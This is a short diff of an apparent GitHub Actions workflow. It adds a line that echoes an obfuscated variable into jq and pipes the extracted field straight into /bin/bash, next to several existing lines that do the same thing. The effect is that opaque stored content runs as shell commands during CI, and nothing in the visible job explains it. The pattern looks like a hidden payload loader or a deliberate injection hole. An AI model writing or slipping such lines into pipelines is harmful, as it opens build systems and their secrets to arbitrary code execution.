@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$ujx80" | jq -r .mlxyr1680 | /bin/bash
           printf '%s' "$zut5" | jq -r .nly663 | /bin/bash
           printf '%s' "$brx2967" | jq -r .ghlk9225 | /bin/bash
+          echo $hmv2 | jq -r .ja43 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
